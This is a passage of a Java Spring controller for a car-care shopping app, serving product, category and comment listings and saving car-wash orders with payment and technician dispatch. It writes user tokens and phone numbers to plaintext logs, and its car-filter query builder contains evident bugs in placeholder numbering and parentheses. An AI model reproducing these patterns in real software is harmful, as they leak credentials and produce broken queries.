			List<Product> products = pageView.getRecords();
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (Product product : products) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pid", product.getId());
				map.put("pname", product.getName());
				map.put("pimage", product.getImgPath());
				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
				if (product.getProuductUniqueType() != null
						&& product.getProuductUniqueType() == 3) {// 天天特价
					map.put("price", product.getDiscountMoney());
				} else {
					map.put("price", product.getMarketPrice());
				}
				map.put("pcomts", commentService.countByPid(product.getId()));
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取商品详细
	 * 
	 */
	@RequestMapping(value = "/product/detail", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productDetail(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, String pid) {
		try {
			log.info("App【获取商品详细】：" + "uid=" + uid + " token=" + token
					+ " pid=" + pid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			Product product = productService.find(pid);
			dataMap.put("result", "001");
			dataMap.put("pid", product.getId());
			dataMap.put("pname", product.getName());
			dataMap.put("pbuynum", product.getBuyProductCount());// 商品购买数
			dataMap.put("pimage", product.getImgPath());
			if (product.getProuductUniqueType() != null
					&& product.getProuductUniqueType() == 3) {// 特价商品：显示折扣后的价格
				dataMap.put("price", product.getDiscountMoney());
			} else {
				dataMap.put("price", product.getMarketPrice());
			}
			dataMap.put("pcomts", commentService.countByPid(product.getId()));
			dataMap.put("purl", "/webpage/product/" + product.getId());
			dataMap.put("cmsup", product.getUseAllCar());
			List<ProductImage> piList = product.getProductImages();
			List<Map<String, String>> imglist = new ArrayList<Map<String, String>>();
			/** 商品图片列表 */
			for (ProductImage image : piList) {
				Map<String, String> map = new LinkedHashMap<String, String>();
				map.put("pimg", image.getSource());
				imglist.add(map);
			}
			dataMap.put("imglist", imglist);

			/** 商品支持的售后服务名称列表 */
			List<Map<String, String>> suplist = new ArrayList<Map<String, String>>();
			Set<ProductLabel> plList = product.getLabels();
			for (ProductLabel pl : plList) {
				Map<String, String> map = new LinkedHashMap<String, String>();
				map.put("suname", pl.getLabelName());
				suplist.add(map);
			}
			dataMap.put("suplist", suplist);

			/** 商品参数信息列表 */
			Map<Parameter, String> paramMap = product.getParameterValue();
			List<Map<String, String>> paramlist = new ArrayList<Map<String, String>>();
			for (Parameter para : paramMap.keySet()) {
				Map<String, String> map = new LinkedHashMap<String, String>();
				map.put("paramname", para.getName());
				map.put("paramvalue", paramMap.get(para));
				paramlist.add(map);
			}
			dataMap.put("paramlist", paramlist);

			/** 支持的车型信息 */
			List<Map<String, String>> cmlist = new ArrayList<Map<String, String>>();
			if (product.getUseAllCar() != 0) {// 0表示支持所有车型
				Set<Car> cars = product.getCarSet();
				for (Car car : cars) {
					Map<String, String> map = new LinkedHashMap<String, String>();
					CarType cartype = car.getCarType();
					CarBrand carBrand = cartype.getCarBrand();
					map.put("cmname",
							carBrand.getName() + " " + cartype.getName() + " "
									+ car.getName());
					cmlist.add(map);
				}
			}
			dataMap.put("cmlist", cmlist);

			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * app首页品牌推荐
	 * 
	 */
	@RequestMapping(value = "/product/brand/recommend", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productBrandRecommend(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取品牌推荐信息】：" + "uid=" + uid + " token=" + token);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			ProductBrand productBrand = productBrandService
					.findOneRecommendBrand();
			dataMap.put("result", "001");
			if (productBrand != null) {
				dataMap.put("bname", productBrand.getName());
				dataMap.put("bimage", productBrand.getImgPath());
			} else {
				dataMap.put("bname", "");
				dataMap.put("bimage", "");
			}
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取品牌推荐下的商品列表
	 * 
	 */
	@RequestMapping(value = "product/brand/recommend/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productBrandRecommendList(
			@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, int page,
			int maxresult) {
		try {
			log.info("App【获取品牌推荐 商品列表】：" + "uid=" + uid + " token=" + token
					+ " page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			ProductBrand productBrand = productBrandService
					.findOneRecommendBrand();
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			if (productBrand != null) {
				PageView<Product> pageView = new PageView<Product>(maxresult,
						page);
				LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
				orderby.put("id", "desc");
				StringBuffer jpql = new StringBuffer(
						"o.visible=?1 and o.productBrand.id=?2");
				List<Object> params = new ArrayList<Object>();
				params.add(true);
				params.add(productBrand.getId());
				pageView.setQueryResult(productService.getScrollData(
						pageView.getFirstResult(), maxresult, jpql.toString(),
						params.toArray(), orderby));
				List<Product> products = pageView.getRecords();
				for (Product product : products) {
					Map<String, Object> map = new LinkedHashMap<String, Object>();
					map.put("pid", product.getId());
					map.put("pname", product.getName());
					map.put("pimage", product.getImgPath());
					map.put("pbuynum", product.getBuyProductCount());// 商品购买数
					if (product.getProuductUniqueType() != null
							&& product.getProuductUniqueType() == 3) {// 天天特价
						map.put("price", product.getDiscountMoney());
					} else {
						map.put("price", product.getMarketPrice());
					}
					map.put("pcomts",
							commentService.countByPid(product.getId()));
					list.add(map);
				}
				dataMap.put("result", "001");
				dataMap.put("pages", pageView.getTotalPage());
				dataMap.put("list", list);
			} else {
				dataMap.put("result", "001");
				dataMap.put("pages", 0);
				dataMap.put("list", list);
			}
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取精品推荐下的商品列表
	 * 
	 */
	@RequestMapping(value = "product/boutique/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productBoutiqueList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, int page,
			int maxresult) {
		try {
			log.info("App【获取精品推荐 商品列表】：" + "uid=" + uid + " token=" + token
					+ " page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			PageView<Product> pageView = new PageView<Product>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.prouductUniqueType=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(2);// 2、限量精品 3、天天特价 4、绿色出行
			pageView.setQueryResult(productService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<Product> products = pageView.getRecords();
			for (Product product : products) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pid", product.getId());
				map.put("pname", product.getName());
				map.put("pimage", product.getImgPath());
				map.put("ptotalnum", product.getProductCount());// 商口总数
				map.put("pbuynum", product.getBuyProductCount());// 已抢数
				if (product.getProuductUniqueType() != null
						&& product.getProuductUniqueType() == 3) {// 天天特价
					map.put("price", product.getDiscountMoney());
				} else {
					map.put("price", product.getMarketPrice());
				}
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取绿色出行的商品列表
	 * 
	 */
	@RequestMapping(value = "product/green/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productGreenList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, int page,
			int maxresult) {
		try {
			log.info("App【获取绿色出行 商品列表】：" + "uid=" + uid + " token=" + token
					+ " page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();

			PageView<Product> pageView = new PageView<Product>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.prouductUniqueType=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(4);// 2、限量精品 3、天天特价 4、绿色出行
			pageView.setQueryResult(productService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<Product> products = pageView.getRecords();
			for (Product product : products) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pid", product.getId());
				map.put("pname", product.getName());
				map.put("pimage", product.getImgPath());
				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
				if (product.getProuductUniqueType() != null
						&& product.getProuductUniqueType() == 3) {// 天天特价
					map.put("price", product.getDiscountMoney());
				} else {
					map.put("price", product.getMarketPrice());
				}
				map.put("pcomts", commentService.countByPid(product.getId()));
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 获取商品评论分页数据
	 * 
	 * @return
	 */
	@RequestMapping(value = "product/comment/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productCommentList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, int page,
			int maxresult, String pid) {
		try {
			log.info("App【商品评论 列表】：" + "uid=" + uid + " token=" + token
					+ " page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
			/** 数据获取 **/
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();

			PageView<Comment> pageView = new PageView<Comment>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("createDate", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.serverOrderDetail.product.id=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(pid);
			pageView.setQueryResult(commentService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<Comment> commentList = pageView.getRecords();
			for (Comment comt : commentList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("cid", comt.getId());
				map.put("cphoto", comt.getMember().getPhoto());
				map.put("cperson", comt.getMember().getNickname());
				try {
					map.put("cmname", comt.getServerOrderDetail().getOrder()
							.getCar().getName());
				} catch (Exception e) {
					map.put("cmname", "");
				}
				map.put("star", comt.getStar() + "");
				map.put("ctime", sdf.format(comt.getCreateDate())); // 1小时前
				map.put("content", comt.getContent());
				List<Map<String, String>> imglist = new ArrayList<Map<String, String>>();
				for (CommentImg img : commentImgService.listForTheComment(comt
						.getId())) {
					Map<String, String> imap = new LinkedHashMap<String, String>();
					imap.put("img", img.getImgPath());
					imglist.add(imap);
				}
				map.put("imglist", imglist);
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取天天特价的商品列表
	 * 
	 */
	@RequestMapping(value = "product/special/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productSpecialList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token, int page,
			int maxresult) {
		try {
			log.info("App【获取天天特价 商品列表】：" + "uid=" + uid + " token=" + token
					+ " page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			PageView<Product> pageView = new PageView<Product>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.prouductUniqueType=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(3); // 2、限量精品 3、天天特价 4、绿色出行
			pageView.setQueryResult(productService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<Product> products = pageView.getRecords();
			for (Product product : products) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pid", product.getId());
				map.put("pname", product.getName());
				map.put("pimage", product.getImgPath());
				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
				map.put("poriprice", product.getMarketPrice()); // 商品原价
				map.put("pdisprice", product.getDiscountMoney()); // 商品折后价
				map.put("pdiscount", product.getDiscount()); // 商品折扣值
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);

			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取首页热卖分类列表
	 * 
	 */
	@RequestMapping(value = "product/category/hot", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productCategoryHot(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取热卖分类列表】：" + "uid=" + uid + " token=" + token
					+ " page=");
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("modifyDate", "desc");
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.hotProductCategory=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(1); // 0 非热卖 1 热卖
			List<ProductCategory> pcList = productCategoryService
					.getScrollData(0, 4, jpql.toString(), params.toArray(),
							orderby).getResultList();
			for (ProductCategory pc : pcList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pcid", pc.getId());
				map.put("pcname", pc.getName());
				map.put("pcimage", pc.getImgPath());
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/***
	 * 获取所有分类列表：进行二级分类展示
	 * 
	 */
	@RequestMapping(value = "product/category/more", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productCategoryMore(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token) {
		try {
			log.info("App【获取热卖分类列表】：" + "uid=" + uid + " token=" + token
					+ " page=");
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("modifyDate", "desc");
			orderby.put("id", "desc");
			StringBuffer jpql = new StringBuffer("o.visible=?1 and o.grade=?2");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			params.add(0); // 0顶级、然后子类依次增加
			List<ProductCategory> topList = productCategoryService
					.getScrollData(jpql.toString(), params.toArray(),
							orderby).getResultList();
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (ProductCategory topPC : topList) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("topid", topPC.getId());
				map.put("topname", topPC.getName());
				List<ProductCategory> childList = productCategoryService
						.listChildCategory(topPC.getId());

				List<Map<String, Object>> pcList = new ArrayList<Map<String, Object>>();
				if (childList != null && childList.size() > 0) {// 有子分类
					for (ProductCategory pc : childList) {
						Map<String, Object> pcmap = new LinkedHashMap<String, Object>();
						pcmap.put("pcid", pc.getId());
						pcmap.put("pcname", pc.getName());
						pcList.add(pcmap);
					}
				} else {
					Map<String, Object> pcmap = new LinkedHashMap<String, Object>();
					pcmap.put("pcid", topPC.getId());
					pcmap.put("pcname", topPC.getName());
					pcList.add(pcmap);
				}
				map.put("pclist", pcList);
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("list", list);
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 根据分类ID获取该分类及子分类下的所有商品
	 * 
	 * @param uid
	 * @param token
	 * @param page
	 * @param maxresult
	 * @return
	 */
	@RequestMapping(value = "product/category/list", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String productCategoryList(@RequestParam(required = false) String uid,
			@RequestParam(required = false) String token,
			@RequestParam(required = false) String ucid, String pcid, int page,
			int maxresult) {
		try {
			log.info("App【获取指定分类下的所有 商品列表】：" + "uid=" + uid + " token=" + token
					+ " page=" + page + " maxresult=" + maxresult);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			/** 数据获取 **/
			PageView<Product> pageView = new PageView<Product>(maxresult, page);
			LinkedHashMap<String, String> orderby = new LinkedHashMap<String, String>();
			orderby.put("id", "desc");

			// 准备所有子分类ID 数据
			List<String> typeids = new ArrayList<String>();
			typeids.add(pcid);
			getTypeids(typeids, new String[] { pcid });

			StringBuffer n = new StringBuffer();
			for (int i = 0; i < typeids.size(); i++) {
				n.append('?').append((i + 2)).append(',');
			}
			n.deleteCharAt(n.length() - 1);
			StringBuffer jpql = new StringBuffer(
					"o.visible=?1 and o.productCategory.id in(" + n + ")");
			List<Object> params = new ArrayList<Object>();
			params.add(true);
			for (int i = 0; i < typeids.size(); i++) {
				params.add(typeids.get(i));
			}
			if (ucid != null && !"".equals(ucid)) {// 适配用户车型
				Car car = userCarService.find(ucid).getCar();
				List<String> pidList = productService.listPidSupportCar(car
						.getId());
				if (pidList != null && pidList.size() > 0) {
					StringBuffer ln = new StringBuffer();
					for (int i = 0; i < pidList.size(); i++) {
						ln.append('?').append((i + 2)).append(',');
					}
					ln.deleteCharAt(n.length() - 1);
					jpql.append("and (o.id in(" + ln + ") or o.useAllCar=0)");
					for (int i = 0; i < pidList.size(); i++) {
						params.add(pidList.get(i));
					}
				} else {
					jpql.append("and o.useAllCar=0)");
				}
			}
			pageView.setQueryResult(productService.getScrollData(
					pageView.getFirstResult(), maxresult, jpql.toString(),
					params.toArray(), orderby));
			List<Product> products = pageView.getRecords();
			List<Map<String, Object>> list = new ArrayList<Map<String, Object>>();
			for (Product product : products) {
				Map<String, Object> map = new LinkedHashMap<String, Object>();
				map.put("pid", product.getId());
				map.put("pname", product.getName());
				map.put("pimage", product.getImgPath());
				map.put("pbuynum", product.getBuyProductCount());// 商品购买数
				if (product.getProuductUniqueType() != null
						&& product.getProuductUniqueType() == 3) {// 天天特价
					map.put("price", product.getDiscountMoney());
				} else {
					map.put("price", product.getMarketPrice());
				}
				map.put("pcomts", commentService.countByPid(product.getId()));
				list.add(map);
			}
			dataMap.put("result", "001");
			dataMap.put("pages", pageView.getTotalPage());
			dataMap.put("list", list);

			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			return json;
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 递归计算出所有子分类ID
	 * 
	 * @param allids
	 *            最终的ID数组
	 * @param pcids
	 *            父类ID数组
	 */
	private void getTypeids(List<String> allids, String[] pcids) {
		List<String> subtypeids = productCategoryService.getSubTypeid(pcids);
		if (subtypeids != null && subtypeids.size() > 0) {
			allids.addAll(subtypeids);
			String[] ids = new String[subtypeids.size()];
			for (int i = 0; i < subtypeids.size(); i++) {
				ids[i] = subtypeids.get(i);
			}
			getTypeids(allids, ids);
		}
	}

	/**
	 * 提交洗车订单
	 * 
	 * @param uid
	 * @param token
	 * @param ucid
	 *            用户车辆信息ID
	 * @param scid
	 *            服务类型
	 * @param contact
	 *            联系方式
	 * @param phone
	 *            联系电话
	 * @param plateNumber
	 *            车牌号
	 * @param color
	 *            车身颜色
	 * @param lat
	 *            纬度
	 * @param lng
	 *            经度
	 * @param address
	 *            详细地址
	 * @param cpid
	 *            优惠券ID
	 * @param cleanType
	 *            清洗方式
	 * @param payWay
	 *            支付方式
	 * @return
	 */
	@RequestMapping(value = "/order/carwash/save", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String orderCarWashSave(String uid, String token, String ucid, String scid,
			String contact, String phone, String plateNumber, String color,
			double lat, double lng, String address, int cleanType, int payWay,
			@RequestParam(required = false) String cpid) {
		try {
			log.info("App【提交洗车订单】：" + "uid=" + uid + " token=" + token
					+ " ucid=" + ucid + " scid=" + scid + " contract="
					+ contact + " phone=" + phone + " plateNumber="
					+ plateNumber + " color=" + color + " lat=" + lat + " lng="
					+ lng + " address=" + address + " cleanType=" + cleanType
					+ " payWay=" + payWay + " cpid=" + cpid);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();

			// 经纬度判断
			if (lat == 0 || lng == 0) {
				dataMap.put("result", "504"); // 经纬度不能为零
				dataMap.put("oid", "");
				dataMap.put("onum", "");
				dataMap.put("payAction", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}
			// 再次判断是否有空闲技师：暂时不作判断、如果这里判断，不利于用户体验。不作判断不影响流程。
			if (payWay == 5) {// 不支持“现场支付”
				dataMap.put("result", "503");
				dataMap.put("oid", "");
				dataMap.put("onum", "");
				dataMap.put("payAction", ""); // 余额不足
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}

			/** 数据获取 **/
			Member member = memberService.find(uid);
			UserCar userCar = userCarService.find(ucid);
			ServiceType serviceType = serviceTypeService.find(scid);

			Order order = new Order();
			order.setContact(contact);
			order.setPhone(phone);
			order.setType(1);// 表示是洗车订单
			order.setLat(lat);
			order.setLng(lng);
			order.setAddress(address);
			order.setServerWay(1);// 上门服务
			order.setPayWay(payWay);
			order.setCleanType(cleanType);
			order.setMember(member);
			order.setCar(userCar.getCar());
			order.setDrange(userCar.getDrange());
			order.setCarColor(color);
			order.setCarNum(plateNumber);
			order.setNum(CommonUtil.getOrderNum()); // 订单编号
			if (cpid != null && !"".equals(cpid)) {
				order.setMemberCoupon(memberCouponService.find(cpid));
			}
			order.setStatus(1); // 派单中
			order.setIsPay(false); // 设置为false为默认值
			/** 核实价格 */
			List<String> scids = new ArrayList<String>();
			scids.add(scid);
			Map<String, String> priceMap = this.calcPrice(scids, null, cpid, 1,
					uid);
			order.setAmount_money(Float.parseFloat(priceMap.get("orimoney"))); // 原价
			order.setAmount_paid(Float.parseFloat(priceMap.get("cpmoney"))); // 优惠了的价钱
			order.setPrice(Float.parseFloat(priceMap.get("paymoney"))); // 实付价

			/* 存储服务类型 */
			ServerOrder serverOrder = new ServerOrder();
			serverOrder.setName(serviceType.getName());
			serverOrder.setPrice(serviceType.getPrice());
			serverOrder.setServiceType(serviceType);
			serverOrder.setOrder(order);
			order.getServerOrder().add(serverOrder);
			/**************** 检测会员卡支付START ************/
			if (payWay == 1) {// 会员卡支付
				double oprice = order.getPrice();
				double userMoney = member.getMoney();
				if (oprice > userMoney) {// 订单价大于了余额
					dataMap.put("result", "001");
					dataMap.put("oid", order.getId());
					dataMap.put("onum", order.getNum());
					dataMap.put("payAction", "3"); // 余额不足
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					return json;
				} else { // 事务处理..
					member.setMoney(CommonUtil.subtract(userMoney + "", oprice
							+ ""));
					order.setIsPay(true);
					orderService.memberCarPay(order, member);
					dataMap.put("result", "001");
					dataMap.put("oid", order.getId());
					dataMap.put("onum", order.getNum());
					dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
					String json = mapper.writeValueAsString(dataMap);
					log.info("App【数据响应】：" + json);
					// new BindPushThread(order.getId()).start();//开辟线程需处理osiv问题
					new BindPushThread(order.getId()).run();
					return json;
				}
			}
			/**************** 检测会员卡支付END ************/
			if (order.getPrice() == 0) { // 不需要支付
				order.setIsPay(true);
				MemberCoupon mc = order.getMemberCoupon();
				if (mc != null) {// 扣除优惠券
					mc.setStatus(1);
					memberCouponService.update(mc);
				}
			}
			orderService.save(order);
			//
			FeeRecord feeRecord = new FeeRecord();
			feeRecord.setType(2);
			feeRecord.setOrder(order);
			feeRecord.setPayWay(order.getPayWay());
			feeRecord.setPhone(order.getPhone());
			feeRecord.setTradeNo(null);
			feeRecord.setFee(order.getPrice());
			feeRecord.setVisible(false);
			feeRecord.setMember(member);
			feeRecordService.save(feeRecord);

			dataMap.put("result", "001");
			dataMap.put("oid", order.getId());
			if (order.getPayWay() == 4) {// 微信支付
				dataMap.put("onum", WexinPay.weixinOrder(order.getNum(),
						order.getPrice(), WeChatPayUtil.pay_return, "洗车订单",
						request));
			} else if (order.getPayWay() == 3) {// 银联支付
				dataMap.put("onum", UnionPay.payNumber(order.getNum(),
						order.getPrice(), UnionPayUtil.pay_return));
			} else {
				dataMap.put("onum", order.getNum());
			}
			dataMap.put("payAction", order.getIsPay() ? "2" : "1"); // 余额不足
			String json = mapper.writeValueAsString(dataMap);
			log.info("App【数据响应】：" + json);
			if (order.getIsPay()) {
				// new BindPushThread(order.getId()).start(); //开辟线程需处理osiv问题
				new BindPushThread(order.getId()).run();
			}
			return json;
		} catch (CouponUseExcepton cue) {
			cue.printStackTrace();
			return "{\"result\":\"502\"}";
		} catch (Exception e) {
			e.printStackTrace();
			return "{\"result\":\"000\"}";
		}
	}

	/**
	 * 绑定技师，推送线程
	 * 
	 * @author Administrator
	 * 
	 */
	class BindPushThread extends Thread {
		private String orderid;

		public BindPushThread(String orderid) {
			this.orderid = orderid;
		}

		@Override
		public void run() {
			boolean bindResult = orderService.bindTechnician(orderid); // 分配技师
			if (bindResult) {// 执行推送
				Order order = orderService.find(orderid);
				Map<String, String> dataMap = new LinkedHashMap<String, String>();
				dataMap.put("orderId", order.getId());
				dataMap.put("orderNum", order.getNum());
				dataMap.put("contact", order.getContact());
				dataMap.put("phone", order.getPhone());
				dataMap.put("car", order.getCar().getName());
				dataMap.put("carNum", order.getCarNum());
				dataMap.put("carColor", order.getCarColor());
				dataMap.put("cleanType", order.getCleanType() + "");
				dataMap.put("mlng", order.getLng() + "");
				dataMap.put("mlat", order.getLat() + "");
				try {// 保留时长根据 “几分钟用户不响应重新分配订单”来设定
					String json = mapper.writeValueAsString(dataMap);
					PushUtil.push("一动车保", "您有一个新的订单，请查收.", 86400, dataMap,
							order.getTechMember().getPushId());
					log.info("【推送】" + json);
				} catch (JsonProcessingException e) {
					e.printStackTrace();
				}
			}
		}
	}

	/**
	 * 提交保养订单
	 * 
	 * @param httpData
	 *            json数据格式
	 *            {"scid1":{"p1":1,"p2":2},"scid2":{"p3":2,"p4":3,"p5":3}}
	 * @return
	 */
	@SuppressWarnings("unchecked")
	@RequestMapping(value = "/order/server/save", produces = "text/html;charset=UTF-8")
	public @ResponseBody
	String orderServerSave(String uid, String token, String ucid, String stime,
			String etime, String contact, String phone, String plateNumber,
			String color, double lat, double lng, String address, int payWay,
			String httpData, @RequestParam(required = false) String cpid,
			@RequestParam(required = false) String remark) {
		try {
			log.info("App【提交保养订单】：" + "uid=" + uid + " token=" + token
					+ " ucid=" + ucid + " stime=" + stime + " etime=" + etime
					+ " contract=" + contact + " phone=" + phone
					+ " plateNumber=" + plateNumber + " color=" + color
					+ " lat=" + lat + " lng=" + lng + " address=" + address
					+ " payWay=" + payWay + " httpData=" + httpData + " cpid="
					+ cpid + " remark=" + remark);
			Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
			// 经纬度判断
			if (lat == 0 || lng == 0) {
				dataMap.put("result", "504"); // 经纬度不能为零
				dataMap.put("oid", "");
				dataMap.put("onum", "");
				dataMap.put("payAction", "");
				String json = mapper.writeValueAsString(dataMap);
				log.info("App【数据响应】：" + json);
				return json;
			}

			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");

			/**************** 再次检查预约服务 时间 STRART **************/
			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			Date now = new Date();
			Date shouldStartDate = DateTimeHelper.addDays(now, 1);
			Date shouldEndDate = DateTimeHelper.addDays(shouldStartDate, 6);
			if (hour >= 16) { // 16:00以后
				shouldStartDate = DateTimeHelper.addDays(now, 2);
				shouldEndDate = DateTimeHelper.addDays(shouldStartDate, 6);
			}
			SimpleDateFormat sdfDate = new SimpleDateFormat("yyyy-MM-dd");
			Date shouldStartTime = DateTimeHelper.parseToDate(
					sdfDate.format(shouldStartDate) + " 09:00",
					"yyyy-MM-dd HH:mm");
			Date shouldEndTime = DateTimeHelper.parseToDate(
					sdfDate.format(shouldEndDate) + " 19:00",
					"yyyy-MM-dd HH:mm");
			Date startTime = sdf.parse(stime);
